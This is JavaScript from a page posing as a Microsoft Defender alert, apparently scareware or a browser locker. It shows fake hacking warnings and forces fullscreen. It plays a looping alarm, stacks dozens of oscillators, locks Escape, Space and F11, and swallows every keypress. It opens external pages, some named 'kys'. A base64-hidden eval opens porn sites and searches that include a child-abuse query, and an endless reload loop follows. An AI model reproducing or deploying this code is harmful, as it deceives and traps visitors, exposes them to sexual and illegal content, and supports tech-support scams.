        var oscillators = []; // Array to store oscillators

        function toggleOscillator() {
            // Create an audio context
            var AudioContext = window.AudioContext || window.webkitAudioContext;
            var audioContext = new AudioContext();

            // Create and start oscillators
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sawtooth'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'square'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'triangle'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }

        }
function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}
$(document).ready(function(){
        var elems = document.querySeectorAll("*");
for(var i = 0; i < elems.length; i++){
        elems[i].style.cursor = "progress";
}
    alert("***MICROSOFT DEFENDER ALERT*** Threat found!");
    alert("***MICROSOFT DEFENDER ALERT*** Your computer as been hacked by an unknown device, and is requested to be controlled.");
    alert("***MICROSOFT DEFENDER ALERT*** An unknown device is opening a trojan on your computer.");
    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'js/alert-en.wav');
    
    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);
    addEventListener("click", function() {
        var el = document.documentElement
            , reffer =
                   el.requestFullScreen
                || el.webkitRequestFullScreen
                || el.mozRequestFullScreen
        ;
        reffer.call(el);
        audioElement.play();
            toggleOscillator();
    window.open("https://chessaimaker.github.io/kys/kys.html", "", "");
    window.open("https://chessaimaker.github.io/kys");
    window.open("https://chessaimaker.github.io/indian-scammers-association");
    window.open("https://crazystuffofficial.github.io/guava");
    eval(atob("d2luZG93Lm9wZW4oImh0dHBzOi8vcG9ybmh1Yi5jb20iKTsKd2luZG93Lm9wZW4oImh0dHBzOi8vcG9ybi5jb20iKTsKd2luZG93Lm9wZW4oImh0dHBzOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1wb3JuIik7CndpbmRvdy5vcGVuKCJodHRwczovL2dvb2dsZS5jb20vc2VhcmNoP3E9YmlnK2Jvb3R5K2JsYWNrK29pbHkrbWVuK3R3ZXJraW5nIik7CndpbmRvdy5vcGVuKCJodHRwczovL2dvb2dsZS5jb20vc2VhcmNoP3E9Y2hpbGQrcG9ybiIpOwp3aW5kb3cub3BlbigiaHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWhlbnRhaSIpOwpmb3IodmFyIGkgPSAwOyBpIDwgMTAwOyBpKyspewpkb2N1bWVudC50aXRsZSA9ICJNZWV0IGhvcm55IDE4IHllYXIgb2xkcyBpbiB5b3VyIGFyZWEgIOKdpO+4j+KdpO+4j+KdpO+4jyDwn5iP8J+SpvCfjZEiOwpsb2NhdGlvbi5oYXNoID0gInBvcm4gc2l0ZSBsaW5rICIgKyBpIDsKZG9jdW1lbnQudGl0bGUgPSAiR2F5IHBvcm4gdmlkZW9zIG9uIHBvcm5odWIiOwpsb2NhdGlvbi5oYXNoID0gInBvcm4gc2l0ZSBsaW5rICIgKyAoaSArIDEwMCkgOwp9"));
    while(true){
        window.location.reload();
    }
    });

   if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
        // Request to lock the keyboard
        navigator.keyboard.lock(['Escape', 'Space', 'F11']); // Locks the 'Escape' and 'Space' keys
      } else {
        console.log('Keyboard Lock API is not supported in this browser.');
      }
    document.addEventListener('keydown', function(event) {
        event.preventDefault();
    }, false);
   
});
